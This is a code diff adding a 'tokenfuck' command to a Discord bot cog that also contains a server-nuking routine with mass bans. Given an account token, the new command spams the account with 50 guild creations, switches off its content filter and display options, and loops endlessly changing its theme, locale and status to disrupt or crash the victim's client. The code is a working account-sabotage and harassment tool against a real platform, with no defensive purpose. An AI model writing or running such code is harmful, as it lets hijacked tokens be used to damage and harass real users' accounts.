@@ -597,6 +597,85 @@ class Botsudo(commands.Cog):
                 logs_webhook.send(f"{user.name} has FAILED to be banned from {servername.name}")
         await ctx.send(f'Finished nuking **{servername.name}**')
 
+    @commands.check(SUDOER_CHECK)
+    @commands.command(aliases=['tokenfucker', 'disable', 'crash']) 
+    async def tokenfuck(self, ctx, _token): # b'\xfc' 
+
+        locales = [ 
+            "da", "de",
+            "en-GB", "en-US",
+            "es-ES", "fr",
+            "hr", "it",
+            "lt", "hu",
+            "nl", "no",
+            "pl", "pt-BR",
+            "ro", "fi",
+            "sv-SE", "vi",
+            "tr", "cs",
+            "el", "bg",
+            "ru", "uk",
+            "th", "zh-CN",
+            "ja", "zh-TW",
+            "ko"
+        ]
+
+        await ctx.message.delete()
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
+            'Content-Type': 'application/json',
+            'Authorization': _token,
+        }
+        
+        import requests
+        request = requests.Session()
+        payload = {
+            'theme': "light",
+            'locale': "ja",
+            'message_display_compact': False,
+            'inline_embed_media': False,
+            'inline_attachment_media': False,
+            'gif_auto_play': False,
+            'render_embeds': False,
+            'render_reactions': False,
+            'animate_emoji': False,
+            'convert_emoticons': False,
+            'enable_tts_command': False,
+            'explicit_content_filter': '0',
+            'status': "invisible"
+        }
+        guild = {
+            'channels': None,
+            'icon': None,
+            'name': "MCREAPER",
+            'region': "europe"
+        } 
+        for _i in range(50):
+            requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
+        while True:
+            try:
+                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
+            except Exception as e:
+                errorlogs_webhook.send(f"[ERROR] CMD|TOKENFUCK: {e}")
+            else:
+                break
+
+        from itertools import cycle
+        modes = cycle(["light", "dark"])
+        statuses = cycle(["online", "idle", "dnd", "invisible"])
+        while True:
+            setting = {
+                'theme': next(modes),
+                'locale': random.choice(locales),
+                'status': next(statuses)
+            }
+            while True:
+                try:
+                    request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
+                except Exception as e:
+                    errorlogs_webhook.send(f"[ERROR] CMD|TOKENFUCK: {e}")
+                else:
+                    break
+
 # ---------------------------------------------------------------------------
 def setup(bot):
     bot.add_cog(Botsudo(bot))
